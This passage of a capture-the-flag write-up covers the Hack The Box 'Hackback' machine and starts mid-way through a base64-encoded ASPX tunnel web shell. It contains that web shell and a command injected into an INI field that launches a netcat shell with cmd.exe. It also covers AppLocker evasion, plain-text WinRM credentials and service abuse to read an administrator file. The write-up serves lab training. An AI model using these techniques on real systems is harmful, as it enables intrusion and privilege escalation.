0LlF1ZXJ5U3RyaW5nLkdldCgiY21kIikuVG9VcHBlcigpOwogICAgICAgICAgICBpZiAoY21kID09ICJDT05ORUNUIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgU3RyaW5nIHRhcmdldCA9IFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJ0YXJnZXQiKS5Ub1VwcGVyKCk7CiAgICAgICAgICAgICAgICAgICAgLy9SZXF1ZXN0LkhlYWRlcnMuR2V0KCJYLVRBUkdFVCIpOwogICAgICAgICAgICAgICAgICAgIGludCBwb3J0ID0gaW50LlBhcnNlKFJlcXVlc3QuUXVlcnlTdHJpbmcuR2V0KCJwb3J0IikpOwogICAgICAgICAgICAgICAgICAgIC8vUmVxdWVzdC5IZWFkZXJzLkdldCgiWC1QT1JUIikpOwogICAgICAgICAgICAgICAgICAgIElQQWRkcmVzcyBpcCA9IElQQWRkcmVzcy5QYXJzZSh0YXJnZXQpOwogICAgICAgICAgICAgICAgICAgIFN5c3RlbS5OZXQuSVBFbmRQb2ludCByZW1vdGVFUCA9IG5ldyBJUEVuZFBvaW50KGlwLCBwb3J0KTsKICAgICAgICAgICAgICAgICAgICBTb2NrZXQgc2VuZGVyID0gbmV3IFNvY2tldChBZGRyZXNzRmFtaWx5LkludGVyTmV0d29yaywgU29ja2V0VHlwZS5TdHJlYW0sIFByb3RvY29sVHlwZS5UY3ApOwogICAgICAgICAgICAgICAgICAgIHNlbmRlci5Db25uZWN0KHJlbW90ZUVQKTsKICAgICAgICAgICAgICAgICAgICBzZW5kZXIuQmxvY2tpbmcgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICBTZXNzaW9uLkFkZCgic29ja2V0Iiwgc2VuZGVyKTsKICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiRElTQ09OTkVDVCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgICAgIHMuQ2xvc2UoKTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKEV4Y2VwdGlvbiBleCl7CgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgU2Vzc2lvbi5BYmFuZG9uKCk7CiAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSBpZiAoY21kID09ICJGT1JXQVJEIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU29ja2V0IHMgPSAoU29ja2V0KVNlc3Npb25bInNvY2tldCJdOwogICAgICAgICAgICAgICAgdHJ5CiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgaW50IGJ1ZmZMZW4gPSBSZXF1ZXN0LkNvbnRlbnRMZW5ndGg7CiAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGJ1ZmYgPSBuZXcgYnl0ZVtidWZmTGVuXTsKICAgICAgICAgICAgICAgICAgICBpbnQgYyA9IDA7CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gUmVxdWVzdC5JbnB1dFN0cmVhbS5SZWFkKGJ1ZmYsIDAsIGJ1ZmYuTGVuZ3RoKSkgPiAwKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgcy5TZW5kKGJ1ZmYpOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBSZXNwb25zZS5BZGRIZWFkZXIoIlgtU1RBVFVTIiwgIk9LIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGV4KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4Lk1lc3NhZ2UpOwogICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYgKGNtZCA9PSAiUkVBRCIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNvY2tldCBzID0gKFNvY2tldClTZXNzaW9uWyJzb2NrZXQiXTsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGludCBjID0gMDsKICAgICAgICAgICAgICAgICAgICBieXRlW10gcmVhZEJ1ZmYgPSBuZXcgYnl0ZVs1MTJdOwogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUgKChjID0gcy5SZWNlaXZlKHJlYWRCdWZmKSkgPiAwKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlW10gbmV3QnVmZiA9IG5ldyBieXRlW2NdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9BcnJheS5Db25zdHJhaW5lZENvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgU3lzdGVtLkJ1ZmZlci5CbG9ja0NvcHkocmVhZEJ1ZmYsIDAsIG5ld0J1ZmYsIDAsIGMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQmluYXJ5V3JpdGUobmV3QnVmZik7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJPSyIpOwogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGNhdGNoIChTb2NrZXRFeGNlcHRpb24gc29leCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiT0siKTsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoIChFeGNlcHRpb24gZXgpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLUVSUk9SIiwgZXguTWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgUmVzcG9uc2UuQWRkSGVhZGVyKCJYLVNUQVRVUyIsICJGQUlMIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgUmVzcG9uc2UuV3JpdGUoIkdlb3JnIHNheXMsICdBbGwgc2VlbXMgZmluZSciKTsKICAgICAgICB9CiAgICB9CiAgICBjYXRjaCAoRXhjZXB0aW9uIGV4S2FrKQogICAgewogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1FUlJPUiIsIGV4S2FrLk1lc3NhZ2UpOwogICAgICAgIFJlc3BvbnNlLkFkZEhlYWRlcigiWC1TVEFUVVMiLCAiRkFJTCIpOwogICAgfQolPgoK")); echo 'everything is probably fine...'?>
```
The output appears to be normal when checking the logs as well:
```bash
[16 April 2020, 07:12:33 PM] 10.10.14.37 - Username: everything is probably fine...?, Password: everything is probably fine...?
```
Let's set up the local instance of `reGeorg` after configuring `proxychains` to utilize port `1337` for the connection:

```bash
➜  HACKBACK vim /etc/proxychains.conf

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4	127.0.0.1 1337
```

```bash
➜  reGeorg git:(master) python reGeorgSocksProxy.py -l 127.0.0.1 -p 1337 -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx

    
                     _____
  _____   ______  __|___  |__  ______  _____  _____   ______
 |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
 |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
 |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
                    |_____|
                    ... every office needs a tool like Georg

  willem@sensepost.com / @_w_m__
  sam@sensepost.com / @trowalts
  etienne@sensepost.com / @kamp_staaldraad
  
   
[INFO   ]  Log Level set to [INFO]
[INFO   ]  Starting socks server [127.0.0.1:1337], tunnel at [http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/tunnel.aspx]
[INFO   ]  Checking if Georg is ready
[INFO   ]  Georg says, 'All seems fine'
```

Just to verify...

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-REGEORG-VERIFY.PNG" class="hackback-img" alt="Hackback - reGeorg Connected">

Nice. Now that we have our tunnel working, let's go ahead and add the credentials we found earlier to a Windows Remote Management connection script called <a href="https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb">winrm_shell.rb</a>, created by a fellow Hack The Box member named <a href="https://www.hackthebox.eu/home/users/profile/179">alamot</a> (tied in with proxychains, of course). We can clone the script to `/opt` and run it according to the syntax provided in its usage menu.

```ruby
#!/usr/bin/ruby
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new( 
  endpoint: 'http://10.10.10.128:5985/wsman',
  transport: :ssl,
  user: 'simple',
  password: 'ZonoProprioZomaro:-(',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = STDIN.gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
```

Once we have the necessary information adjusted, we can give it a try.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-WINRM-CONNECT.PNG" class="hackback-img" alt="Hackback - WinRM Connected">

Woohoo! We finally managed to connect as `simple`. However, after checking out the directories, there still doesn't appear to be a `user.txt` file...

```bash
PS hackback\simple@HACKBACK Desktop> dir -h

    Directory: C:\Users\simple\Desktop

Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a-hs-       12/21/2018   6:20 AM            282 desktop.ini                                                                                                                                                                                          
PS hackback\simple@HACKBACK Desktop> type desktop.ini

[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21769
IconResource=%SystemRoot%\system32\imageres.dll,-183
```

### Privilege Escalation & Obtaining user.txt

Enumeration is going to be pretty annoying for us at this point, especially since the WinRM shell is already a bit slow while running through the `reGeorg` tunnel. Upon traversing to `C:\` however, we locate an interesting hidden directory in `util` called `scripts`.

```bash
PS hackback\simple@HACKBACK C:\> cd util
PS hackback\simple@HACKBACK util> dir -h


    Directory: C:\util


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
d--h--       12/21/2018   6:21 AM                scripts
```

Checking permissions on the directory, we notice it is owned by a user called `hacker`.

```bash
PS hackback\simple@HACKBACK > Get-Acl | fl


Path   : Microsoft.PowerShell.Core\FileSystem::C:\util\scripts
Owner  : HACKBACK\hacker
Group  : HACKBACK\None
Access : CREATOR OWNER Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         HACKBACK\simple Allow  ReadAndExecute, Synchronize
         HACKBACK\hacker Allow  Modify, Synchronize
         HACKBACK\hacker Allow  FullControl
```

After entering the `scripts` directory, we also discover a file called `clean.ini`. The contents of the `clean.ini` file are as follows:

```bash
PS hackback\simple@HACKBACK > type clean.ini
[Main] 
LifeTime=100 
LogFile=c:\util\scripts\log.txt
Directory=c:\inetpub\logs\logfiles
```

Since the file appears to deal with logs, we are naturally interested in the `powershell` script called `dellog.ps1`, also located in the `scripts` directory. Let's attempt to read the contents of the `dellog.ps1` file as a result.

```bash
PS hackback\simple@HACKBACK > type dellog.ps1
Access to the path 'C:\util\scripts\dellog.ps1' is denied.
```

We are promptly denied...
<p><br></p>

Let's try to view the `dellog.bat` file as well.

```bash
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> cat C:\util\scripts\dellog.bat
@echo off
rem =scheduled=
echo %DATE% %TIME% start bat >c:\util\scripts\batch.log
powershell.exe -exec bypass -f c:\util\scripts\dellog.ps1 >> c:\util\scripts\batch.log
for /F "usebackq" %%i in (`dir /b C:\util\scripts\spool\*.bat`) DO (
start /min C:\util\scripts\spool\%%i
timeout /T 5
del /q C:\util\scripts\spool\%%i
)
```

Cool! We can see the contents. The script appears to execute `dellog.ps1` first and then append the resulting output to `batch.log`. After that it runs the contents of the `spool` folder. By the looks of it though, we don't have permission to view the folder.
<p><br></p>

However, we can observe the user `simple` is a member of the `project-managers` group – a group that's able to write to the `clean.ini` file.

```bash
PS hackback\simple@HACKBACK > whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID                                           Attributes                                        
==================================== ================ ============================================= ==================================================
Everyone                             Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
HACKBACK\project-managers            Alias            S-1-5-21-2115913093-551423064-1540603852-1005 Mandatory group, Enabled by default, Enabled group
```

We can verify this using `icacls`:

```bash
PS hackback\simple@HACKBACK > icacls clean.ini
clean.ini NT AUTHORITY\SYSTEM:(F)
          BUILTIN\Administrators:(F)
          HACKBACK\project-managers:(M)
```
At this point, a teammate of mine discovered the `LogFile` parameter in the `clean.ini` file was vulnerable to command injection. The `powershell` script called `dellog.ps1` was used to wipe the log file, but used the `LogFile` parameter to pipe output. This left it vulnerable to arbitrary command injection after writing.

In the meantime, let's upgrade to a better shell. I prefer to utilize the <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> shell instead. This shell was created by another fellow Hack The Box member, and offers upload/download capabilities as well as some other cool usability features.

```bash
➜  HACKBACK proxychains evil-winrm -u simple -p 'ZonoProprioZomaro:-(' -i 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

+*Evil-WinRM* PS C:\Users\simple\Documents>
```

Equipped with our new and improved shell, let's try to upload `nc.exe` to the machine in an attempt to abuse the aforementioned command injection vulnerability in the `clean.ini` file. 
<p><br></p>

We are able to upload `nc.exe` to the `C:\Windows\System32\spool\drivers\color` directory to avoid AppLocker using the built-in upload capability of `evil-winrm`. We can also append a `cmd.exe` command to call `nc.exe` in the `LogFile` parameter immediately after. 

```bash
➜  HACKBACK cd www
➜  www ls -al
total 56
drwxr-xr-x 2 root root  4096 Apr 16 17:26 .
drwxr-xr-x 5 root root  4096 Apr 16 17:26 ..
-rwxr-xr-x 1 root root 45272 Apr 16 17:26 nc.exe
➜  www proxychains evil-winrm -u simple -p 'ZonoProprioZomaro:-(' -i 127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)

Evil-WinRM shell v2.0

Info: Establishing connection to remote endpoint

+*Evil-WinRM* PS C:\Users\simple\Documents> cd C:\Windows\System32\spool\drivers\color
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> upload nc.exe
Info: Uploading nc.exe to C:\Windows\System32\spool\drivers\color\nc.exe

Data: 60360 bytes of 60360 bytes copied

Info: Upload successful!

+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> dir


    Directory: C:\Windows\System32\spool\drivers\color


Mode                LastWriteTime         Length Name                                                                                                                                                                                                    
----                -------------         ------ ----                                                                                                                                                                                                    
-a----        9/15/2018  12:12 AM           1058 D50.camp                                                                                                                                                                                                
-a----        9/15/2018  12:12 AM           1079 D65.camp                                                                                                                                                                                                
-a----        9/15/2018  12:12 AM            797 Graphics.gmmp                                                                                                                                                                                           
-a----        9/15/2018  12:12 AM            838 MediaSim.gmmp                                                                                                                                                                                           
-a----        4/16/2020   9:33 PM          45272 nc.exe                                                                                                                                                                                                  
-a----        9/15/2018  12:12 AM            786 Photo.gmmp                                                                                                                                                                                              
-a----        9/15/2018  12:12 AM            822 Proofing.gmmp                                                                                                                                                                                           
-a----        9/15/2018  12:12 AM         218103 RSWOP.icm                                                                                                                                                                                               
-a----        9/15/2018  12:12 AM           3144 sRGB Color Space Profile.icm                                                                                                                                                                            
-a----        9/15/2018  12:12 AM          17155 wscRGB.cdmp                                                                                                                                                                                             
-a----        9/15/2018  12:12 AM           1578 wsRGB.cdmp
```

We're then able to modify the `clean.ini` file to contain a `cmd.exe` call to `nc.exe` and our listener's port (9001) running over `proxychains`.

```bash
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> echo [Main] > C:\util\scripts\clean.ini
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> echo LifeTime=100 >> C:\util\scripts\clean.ini
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> echo "LogFile=c:\util\scripts\log.txt & cmd.exe /c C:\windows\system32\spool\drivers\color\nc.exe -lnvp 9001 -e cmd.exe" >> C:\util\scripts\clean.ini
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> type C:\util\scripts\clean.ini
[Main]
LifeTime=100
LogFile=C:\util\scripts\log.txt & cmd.exe /c C:\Windows\System32\spool\drivers\color\nc.exe -lvp 9001 -e cmd.exe
```

After a couple retries starting and restarting (and restarting again...) our listener, we catch a shell as the user `hacker`. We're finally able to view `user.txt`!

```bash
➜  HACKBACK proxychains nc hackback.htb 9001
ProxyChains-3.1 (http://proxychains.sf.net)
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami 
whoami 
hackback\hacker

C:\Windows\system32>cd C:\Users\hacker\Desktop & type user.txt
cd C:\Users\hacker\Desktop & type user.txt
922449f8e39c2<redacted>
```

### Enumerating as `hacker`

Now that we are operating as `hacker`, we can refer to some of the services running on the machine to determine what we may be able to control. Running `grep` for `user` can help us locate a couple interesting ones; a service called `UserLogger` as well as another called `UserManager`. 

```bash
➜  www curl -s http://10.10.10.128:6666/services > ../services.txt
➜  www cd ..;cat services.txt| grep User
        "displayname":  "Connected User Experiences and Telemetry",
        "displayname":  "User Profile Service",
        "displayname":  "User Access Logging Service",
        "displayname":  "User Experience Virtualization Service",
        "displayname":  "Remote Desktop Services UserMode Port Redirector",
        "name":  "UserLogger",
        "displayname":  "User Logger",
        "name":  "UserManager",
        "displayname":  "User Manager"
```

Maintaining the theme of `logs`, we're able to determine `UserLogger` might be a solid one to check out first. Let's query the service to check its current status.

```bash
C:\Users\hacker\Desktop>cmd /c "sc qc userlogger"
cmd /c "sc qc userlogger"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: userlogger
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : c:\windows\system32\UserLogger.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : User Logger
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

Nice, we verified the path of the binary as well: `c:\windows\system32\UserLogger.exe`. Let's also run `sdshow` to determine if the user `hacker` is able to start/stop the service.

```bash
C:\Users\hacker\Desktop>cmd /c "sc sdshow userlogger"
cmd /c "sc sdshow userlogger"

D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWRPWPDTLORC;;;S-1-5-21-2115913093-551423064-1540603852-1003)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLORC;;;BU)(A;;CCLCSWRPWPLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
```

Perfect. We can verify this again by copying the SID `S-1-5-21-2115913093-551423064-1540603852-1003` and then running `wmic` to compare it with the SID of `hacker`.

```bash
C:\Users\hacker\Desktop>cmd /c "wmic useraccount where name='hacker' get sid"
cmd /c "wmic useraccount where name='hacker' get sid"
SID                                            
S-1-5-21-2115913093-551423064-1540603852-1003 
```

They match, so now we're positive our current user can start/stop the `UserLogger` service.
<p><br></p>

While we're at it, let's also check some additional details about the service with Powershell.

```bash
+*Evil-WinRM* PS C:\Windows\System32\spool\drivers\color> get-service userlogger | fl *
Name                : userlogger
RequiredServices    : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : True
DisplayName         : User Logger
DependentServices   : {}
MachineName         : .
ServiceName         : userlogger
ServicesDependedOn  : {}
ServiceHandle       : 
Status              : Running
ServiceType         : Win32OwnProcess
StartType           : Manual
Site                : 
Container           :
```

We should also try to download the `userlogger.exe` binary using the `evil-winrm` shell to reverse it and fully understand what it's doing.

```bash
+*Evil-WinRM* PS C:\Windows\System32> download userlogger.exe
Info: Downloading C:\Windows\System32\userlogger.exe to userlogger.exe

Info: Download successful!

----

➜  www ls -al
total 112
drwxr-xr-x 2 root root  4096 Apr 17 10:42 .
drwxr-xr-x 5 root root  4096 Apr 17 10:08 ..
-rwxr-xr-x 1 root root 45272 Apr 16 17:26 nc.exe
-rw-r--r-- 1 root root 54784 Apr 17 10:42 userlogger.exe
➜  www 
```

No need to reverse this entirely yet. Let's try the lazy route and run `strings`.

```bash
➜  www strings userlogger.exe
!This program cannot be run in DOS mode.
Rich]
UPX0
UPX1
```

We notice the third and fourth lines include `UPX0` and `UPX1`, which refers to UPX file packing.

Let's try utilizing `upx` for linux with the `-d` flag to decompress the UPX packed binary.

```bash
➜  www upx -d userlogger.exe -o userlogger.upx.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2018
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     90624 <-     54784   60.45%    win64/pe     userlogger.upx.exe

Unpacked 1 file.
```

This will make the `strings` output display more calls/functions, therefore creating more useful output.

```
➜  www strings userlogger.upx.exe 
...
GetOEMCP
GetCPInfo
GetEnvironmentStringsW
FreeEnvironmentStringsW
SetEnvironmentVariableW
CompareStringW
LCMapStringW
SetStdHandle
GetFileType
GetStringTypeW
GetProcessHeap
HeapSize
HeapReAlloc
FlushFileBuffers
GetConsoleCP
GetConsoleMode
SetFilePointerEx
WriteConsoleW
```

We can import the unpacked binary into Ghidra to further reverse the functions.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-UL-GHIDRA-IMPORT.PNG" class="hackback-img" alt="Hackback - UserLogger.exe Ghidra Import">

Ghidra then analyzes the binary upon importing as well.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-ANALYZE-BINARY.PNG" class="hackback-img" alt="Hackback - UserLogger.exe Ghidra Analysis">

After doing some further analysis, we can determine the binary accepts an argument.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-BINARY-ARGUMENT.PNG" class="hackback-img" alt="Hackback - UserLogger.exe Takes Argument">

Further examination reveals a `.log` file is generated with the same name as the argument.

<img src="/assets/img/writeups/HTB-HACKBACK/HACKBACK-LOGFILE-GENERATED.PNG" class="hackback-img" alt="Hack The Box - Hackback">

We are able to verify this process by creating a dummy `.log` file and specifying it as a parameter when starting the `UserLogger` service.

```bash
C:\Users\hacker\Documents>sc start userlogger c:\users\hacker\documents\farbs.log
sc start userlogger c:\users\hacker\documents\farbs.log

SERVICE_NAME: userlogger 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3616
        FLAGS              : 
```

Afterwards, we observe another `.log` file has been generated as expected.

```bash
C:\Users\hacker\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 00A3-6B07

 Directory of C:\Users\hacker\Documents

04/17/2020  05:08 PM    <DIR>          .
04/17/2020  05:08 PM    <DIR>          ..
04/17/2020  05:07 PM                19 farbs.log
04/17/2020  05:08 PM                58 farbs.log.log
```

Let's check the contents of it as well.

```bash
C:\Users\hacker\Documents>type farbs.log.log
type farbs.log.log
Logfile specified!
Service is starting
Service is running
```

<b>Sidenote:</b> It's worth mentioning that your shell needs to be a 64-bit process for this to work properly, so make sure you are using a 64-bit version of netcat.
<p><br></p>

At this point it's time for us to stop `UserLogger` and focus on getting a proper shell, or at least reading `root.txt`.

```bash
C:\Users\hacker\Documents>sc stop userlogger
sc stop userlogger

SERVICE_NAME: userlogger 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 3  STOP_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0
```

We're able to adjust permissions on the `root.txt` file with Powershell by appending the path of `root.txt` to the first `UserLogger` argument parameter. We can additionally append a colon `:` to the end of `root.txt` so the `.log` extension will no longer be appended, but the file permissions associated with it will remain intact.

```bash
PS C:\Users\Administrator> sc.exe start userlogger "c:\users\administrator\desktop\root.txt:"
sc.exe start userlogger "c:\users\administrator\desktop\root.txt:"

SERVICE_NAME: userlogger 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 5612
        FLAGS              :
```

Doing so results in the ability to read `root.txt`.

```bash
PS C:\Users\Administrator> cat c:\users\administrator\desktop\root.txt
cat c:\users\administrator\desktop\root.txt

                                __...----..
                             .-'           `-.
                            /        .---.._  \
                            |        |   \  \ |
                             `.      |    | | |        _____
                               `     '    | | /    _.-`      `.
                                \    |  .'| //'''.'            \
                                 `---'_(`.||.`.`.'    _.`.'''-. \
                                    _(`'.    `.`.`'.-'  \\     \ \
                                   (' .'   `-._.- /      \\     \ |
                                  ('./   `-._   .-|       \\     ||
                                  ('.\ | | 0') ('0 __.--.  \`----'/
                             _.--('..|   `--    .'  .-.  `. `--..'
               _..--..._ _.-'    ('.:|      .  /   ` 0 `   \
            .'         .-'        `..'  |  / .^.           |
           /         .'                 \ '  .             `._
        .'|                              `.  \`...____.----._.'
      .'.'|         .                      \ |    |_||_||__|
     //   \         |                  _.-'| |_ `.   \
     ||   |         |                     /\ \_| _  _ |
     ||   |         /.     .              ' `.`.| || ||
     ||   /        ' '     |        .     |   `.`---'/
   .' `.  |       .' .'`.   \     .'     /      `...'
 .'     \  \    .'.'     `---\    '.-'   |
)/\ / /)/ .|    \             `.   `.\   \
 )/ \(   /  \   |               \   | `.  `-.
  )/     )   |  |             __ \   \.-`    \
         |  /|  )  .-.      //' `-|   \  _   /
        / _| |  `-'.-.\     ||    `.   )_.--'
        )  \ '-.  /  '|     ''.__.-`\  | 
       /  `-\  '._|--'               \  `.
       \    _\                       /    `---.
       /.--`  \                      \    .''''\
       `._..._|                       `-.'  .-. |
                                        '_.'-./.'
PS C:\Users\Administrator> 
```

But hold up... That's <b> definitely </b> not an MD5 hash. The creators of the machine are on a team called "Donkeys", so we can imagine this is probably just a prank by the creators... NTFS file systems are capable of storing information in alternate data streams (ADS) however, so let's check ADS contents with Powershell.

```bash
PS C:\Users\Administrator\Desktop> Get-Item -Force -Path root.txt -Stream *
Get-Item -Force -Path root.txt -Stream *


PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\root.txt::$DATA
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop
PSChildName   : root.txt::$DATA
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\Administrator\Desktop\root.txt
Stream        : :$DATA
Length        : 1958

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\root.txt:.log
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop
PSChildName   : root.txt:.log
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\Administrator\Desktop\root.txt
Stream        : .log
Length        : 174

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop\root.txt:flag.txt
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\Administrator\Desktop
PSChildName   : root.txt:flag.txt
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\Administrator\Desktop\root.txt
Stream        : flag.txt
Length        : 35
```

We then notice the following line:
